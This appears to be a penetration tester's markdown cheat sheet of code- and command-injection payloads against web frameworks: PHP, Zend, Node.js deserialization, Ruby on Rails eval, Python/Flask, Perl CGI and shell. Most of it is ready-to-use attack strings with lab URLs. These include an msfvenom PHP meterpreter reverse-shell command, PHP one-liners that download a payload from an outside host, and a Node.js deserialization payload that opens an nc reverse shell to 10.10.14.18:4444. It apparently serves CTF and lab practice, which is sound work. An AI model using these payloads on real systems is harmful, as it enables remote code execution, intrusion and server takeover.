# Web apps Frameworks exploit










=============================================================
## php

### echo, print
Add a .system('ls'). in an echo $GET['name']
````
bob".system('ls')."bob
````
http://ptl-41df0d58-5b5fffd3.libcurl.so/?name=hacker”.system(‘ls’).”bob



### preg_replace()
php can filter thanks to preg_replace(). /e flag can be used.
Use arg in evaluation function
echo preg_replace("/([a-z]*)", "hacker", “you are a lamer’); => you are a hacker
echo preg_replace("/([a-z]*)/e", "hacker", “you are a lamer’); => eval “hacker”, replace hacker by system(‘ls’)
http://ptl-d47b409d-42207d73.libcurl.so/?new=system(‘ls’)&pattern=/lamer/e&base=Hello lamer

Use arg in assert
http://ptl-ac7d180e-5efc435d.libcurl.so/?name=hacker’.system(‘ls’).’ //


### Php payloads

    msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.168.168 LPORT=443 R > revshell.php

    <?php echo (`whoami`); ?>
    <?php echo (`ls -l /tmp/`); ?>
    <?php echo `ifconfig`; ?>
    <?php echo `wget -O /upload/directory/payload.php http://192.168.168.168/blackwinter.php`; ?>
    <?php echo shell_exec("fetch -o /upload/directory/payload.php http://192.168.168.168/blackwinter.php"); ?>


=============================================================
## php zend framework

    ?order=id;}//
    ?order=id);}//
    ?order=id));}//
    Try to find the correct number of ) and }

    Then ?order=id);}system('uname%20-a');//


=============================================================
## Node JS

### JavaScript DeSerialisation
    Cookie: profile=eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ%3D%3D
    Decode Base64
    {"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}

    Explications : https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
& Mega JS payload


    On test avec un ping 
    {"rce":"_$$ND_FUNC$$_function (){ require('child_process').exec('ping 10.10.14.18', function(error, stdout, stderr) { console.log(stdout) }); }()", "username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}
    # tcpdump -i tun0 icmp

    Payload avec un reverse shell
    {"rce":"_$$ND_FUNC$$_function (){ require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 4444 >/tmp/f', function(error, stdout, stderr) { console.log(stdout) }); }()", "username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}


=============================================================
## Perl
```
# perl -e 'system("ls")'
```

## Sonar risks

https://rules.sonarsource.com/php/RSPEC-3331

=============================================================

## Ruby on rail

https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheatsheet.html

### eval

ActiveRecord (Ruby-on-Rails' most common data mapper)
Function eval with param. Add an error with "
````
POST: user[name]=bob&user[password]=pwd&user[admin]=true
@message = eval "\"Hello "+params['username']+"\""
username=hacker”+`uname -a`+” : échapper les + en %2B
http://ptl-f3335912-d8dff103.libcurl.so/?username=hacker%22%2B`uname%20-a`%2B%22
````


=============================================================

## python
### print()
Check with " or '
````
Check :
http://vuln.com/hello/hacker” should generate error

Is python ? hacker”+str(True)+”test
http://vuln.com/hello/hacker"+str(True)+"test

Put code in str()
http://vuln.com/hello/hacker%22%2bstr(os.system('id'))%2b%22test

To get stdout, use os.popen('id').read()
http://vuln.com/hello/hacker%22%2bstr(os.popen('id').read())%2b%22test

If os is not loaded
http://vuln.com/hello/hacker%22%2bstr(__import__('os').popen('id').read())%2b%22test

Flask framework filter / after main path, encode it in base64
uname -a => __import__('base64').b64decode('dW5hbWUgLWE=')

http://ptl-7fc82aee-40987409.libcurl.so/hello/hacker%22%2bstr(__import__('os').popen(__import__('base64').b64decode(%22dW5hbWUgLWE=%22)).read())%2b%22test

Note :
+ %2b
" %22

````


=============================================================

## Apache .htaccess

Upload a crafted .htacess : https://github.com/wireghoul/htshells


=============================================================
## shell 

### Add a command with ;
thanks to php exec
http://ptl-e178378e-fe879fa4.libcurl.so/?ip=127.0.0.1;ls

### Execute with back quote
````
http://ptl-4938c1df-399c9d4e.libcurl.so/?ip=`cmd`  : no output but cmd executed :)
=> ping -c 2 `cmd`
````

### $(command) to run a shell command.
````
http://ptl-836d9020-8f3b7b55.libcurl.so/?ip=$(touch /tmp/bob)
=> ping -c 2 $(touch /tmp/bob)
````


## cgi in perl called by jquery
$.getJSON("/cgi-bin/hello?name="+document.location.hash.substring(1), function (data) {
http://ptl-f2dc2643-c482a93d.libcurl.so//cgi-bin/hello?name=bob%27.`uname`.%27



